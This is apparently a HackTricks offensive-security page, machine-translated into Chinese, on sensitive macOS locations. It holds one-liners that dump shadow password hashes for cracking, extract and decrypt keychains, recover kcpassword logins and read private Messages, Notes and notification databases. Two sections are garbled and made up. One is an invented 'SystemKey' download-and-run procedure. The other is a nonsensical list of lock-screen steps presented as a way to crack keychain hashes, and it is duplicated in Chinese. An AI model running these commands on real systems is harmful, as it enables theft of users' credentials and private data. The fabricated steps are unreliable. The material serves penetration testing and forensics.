# macOS敏感位置

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一个**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)或**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

## 密码

### 影子密码

影子密码与用户的配置一起存储在位于**`/var/db/dslocal/nodes/Default/users/`**的plist文件中。\
以下一行命令可用于转储**有关用户的所有信息**（包括哈希信息）：

{% code overflow="wrap" %}
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
{% endcode %}

[**像这个脚本**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) 或者 [**这个脚本**](https://github.com/octomagon/davegrohl.git) 可以用来将哈希转换为 **hashcat** **格式**。

另一种方法是使用以下一行命令将所有非服务账户的凭证以 hashcat 格式 `-m 7100`（macOS PBKDF2-SHA512）进行转储：

{% code overflow="wrap" %}
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
{% endcode %}

### 密钥链转储

请注意，当使用 security 二进制文件来转储解密的密码时，会出现多个提示要求用户允许此操作。
```bash
#security
secuirty dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
### [Keychaindump](https://github.com/juuso/keychaindump)

{% hint style="danger" %}
根据这个评论 [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760)，看起来这些工具在Big Sur上不再起作用。
{% endhint %}

攻击者仍然需要获取系统访问权限并升级为**root**权限才能运行**keychaindump**。这种方法有自己的条件。如前所述，**登录后，默认情况下会解锁您的钥匙串**，并在您使用系统时保持解锁状态。这是为了方便用户，使得用户不需要每次应用程序希望访问钥匙串时都输入密码。如果用户更改了此设置并选择在每次使用后锁定钥匙串，keychaindump将不再起作用；它依赖于解锁的钥匙串才能正常工作。

了解Keychaindump如何从内存中提取密码非常重要。在此过程中，最重要的进程是“**securityd**”进程。苹果将此进程称为**用于授权和加密操作的安全上下文守护程序**。苹果的开发者库对此并没有提供太多信息；然而，它们确实告诉我们securityd处理对钥匙串的访问。在他的研究中，Juuso将用于解密钥匙串的密钥称为“主密钥”。要读取钥匙串文件，您必须拥有此主密钥。可以执行以下步骤来获取它。**扫描securityd的堆（keychaindump使用vmmap命令执行此操作）**。可能的主密钥存储在标记为MALLOC\_TINY的区域中。您可以使用以下命令自己查看这些堆的位置：
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
**Keychaindump** 然后会在返回的堆中搜索 0x0000000000000018 的出现次数。如果以下 8 字节的值指向当前堆，我们就找到了一个潜在的主密钥。从这里开始，还需要进行一些解混淆的工作，可以在源代码中看到，但作为分析师，最重要的是要注意解密这些信息所需的数据存储在 securityd 的进程内存中。以下是 keychain dump 输出的示例。
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker)可以以法医学的方式从OSX钥匙串中提取以下类型的信息：

* 经过哈希处理的钥匙串密码，适用于使用[hashcat](https://hashcat.net/hashcat/)或[John the Ripper](https://www.openwall.com/john/)进行破解
* 互联网密码
* 通用密码
* 私钥
* 公钥
* X509证书
* 安全笔记
* Appleshare密码

如果给定了钥匙串解锁密码、使用[volafox](https://github.com/n0fate/volafox)或[volatility](https://github.com/volatilityfoundation/volatility)获取的主密钥，或者解锁文件（如SystemKey），Chainbreaker还将提供明文密码。

如果没有这些解锁钥匙串的方法，Chainbreaker将显示所有其他可用的信息。

### **转储钥匙串密钥**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
### **使用SystemKey转储钥匙串密钥（包括密码）**

To dump keychain keys (with passwords) using SystemKey, follow these steps:

1. Open Terminal and run the following command to download SystemKey:

   ```
   curl -O https://github.com/kennytm/SystemKey/raw/master/SystemKey
   ```

2. Make the downloaded file executable by running the following command:

   ```
   chmod +x SystemKey
   ```

3. Run the SystemKey command with the `-d` flag to dump the keychain keys:

   ```
   ./SystemKey -d
   ```

   This will display the keychain keys along with their associated passwords.

Note: Dumping keychain keys with passwords can be a sensitive operation, so ensure that you have the necessary permissions and authorization to perform this action.
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
### **转储钥匙串密钥（包括密码）并破解哈希值**

To dump keychain keys (with passwords) and crack the hash, follow these steps:

1. Open the Keychain Access application on your macOS system.
2. Navigate to the "Keychain Access" menu and select "Preferences".
3. In the "Preferences" window, go to the "General" tab.
4. Check the box next to "Show keychain status in menu bar".
5. Close the "Preferences" window.
6. In the menu bar, you will now see a lock icon. Click on it and select "Lock Screen".
7. Enter your user password to lock the screen.
8. Press the power button to put your system to sleep.
9. Wake up your system by pressing any key or clicking the mouse.
10. Enter your user password to unlock the screen.
11. Open the Terminal application.
12. Type the following command and press Enter: `security dump-keychain -d login.keychain > keychain_dump.txt`
13. This command will dump the keychain keys (including passwords) into a file named "keychain_dump.txt".
14. Use a hash cracking tool, such as John the Ripper or Hashcat, to crack the hash values and retrieve the passwords.

请按照以下步骤转储钥匙串密钥（包括密码）并破解哈希值：

1. 在您的 macOS 系统上打开“钥匙串访问”应用程序。
2. 导航到“钥匙串访问”菜单，选择“偏好设置”。
3. 在“偏好设置”窗口中，转到“常规”选项卡。
4. 勾选“在菜单栏中显示钥匙串状态”的复选框。
5. 关闭“偏好设置”窗口。
6. 在菜单栏中，您现在会看到一个锁形图标。单击它，选择“锁定屏幕”。
7. 输入您的用户密码以锁定屏幕。
8. 按下电源按钮将系统置于睡眠状态。
9. 通过按任意键或点击鼠标唤醒系统。
10. 输入您的用户密码以解锁屏幕。
11. 打开“终端”应用程序。
12. 输入以下命令并按回车键：`security dump-keychain -d login.keychain > keychain_dump.txt`
13. 此命令将钥匙串密钥（包括密码）转储到名为“keychain_dump.txt”的文件中。
14. 使用哈希破解工具，如John the Ripper或Hashcat，破解哈希值并检索密码。
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
### **使用内存转储来转储钥匙串密钥（包括密码）**

[按照以下步骤](..#使用-osxpmem-进行内存转储)执行**内存转储**操作
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
### **使用用户密码转储钥匙串密钥（包括密码）**

如果您知道用户的密码，您可以使用该密码来**转储和解密属于该用户的钥匙串**。
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### kcpassword

**kcpassword**文件是一个保存**用户登录密码**的文件，但只有在系统所有者**启用自动登录**时才会存在。因此，用户将自动登录而无需输入密码（这并不安全）。

密码存储在文件**`/etc/kcpassword`**中，与密钥**`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**进行异或运算。如果用户的密码比密钥长，密钥将被重复使用。\
这使得密码很容易被恢复，例如使用[**这个脚本**](https://gist.github.com/opshope/32f65875d45215c3677d)。

## 数据库中的有趣信息

### Messages
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### 通知

您可以在 `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/` 中找到通知数据。

大部分有趣的信息都会在 **blob** 中。因此，您需要 **提取** 该内容并将其转换为 **可读** 的格式，或者使用 **`strings`** 命令。要访问它，您可以执行以下操作：

{% code overflow="wrap" %}
```bash
cd $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/
strings $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db | grep -i -A4 slack
```
### 注意事项

用户的**笔记**可以在`~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`中找到

{% code overflow="wrap" %}
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

#To dump it in a readable format:
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.Z ; done
```
{% endcode %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)或**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>
